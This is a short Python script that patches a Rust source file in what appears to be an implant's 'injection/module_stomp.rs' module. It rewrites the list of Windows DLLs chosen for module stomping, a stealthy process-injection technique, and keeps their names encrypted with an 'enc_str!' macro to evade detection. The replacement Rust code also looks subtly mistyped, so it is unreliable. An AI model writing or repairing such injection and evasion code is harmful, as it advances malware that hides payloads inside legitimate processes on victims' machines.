import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error by keeping the objects alive
text = text.replace('''            let c1 = enc_str!("msfte.dll");
            let c2 = enc_str!("msratelc.dll");
            let c3 = enc_str!("scrobj.dll");
            let c4 = enc_str!("amstream.dll");
            let candidates = vec![
                c1.as_ref(),
                c2.as_ref(),
                c3.as_ref(),
                c4.as_ref()
            ];''', '''
            let mut candidates: Vec<&[u8]> = Vec::new();
            let mut c1 = enc_str!("msfte.dll");
            let mut c2 = enc_str!("msratelc.dll");
            let mut c3 = enc_str!("scrobj.dll");
            let mut c4 = enc_str!("amstream.dll");
            candidates.push(&c1);
            candidates.push(&c2);
            candidates.push(&c3);
            candidates.push(&c4);
''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

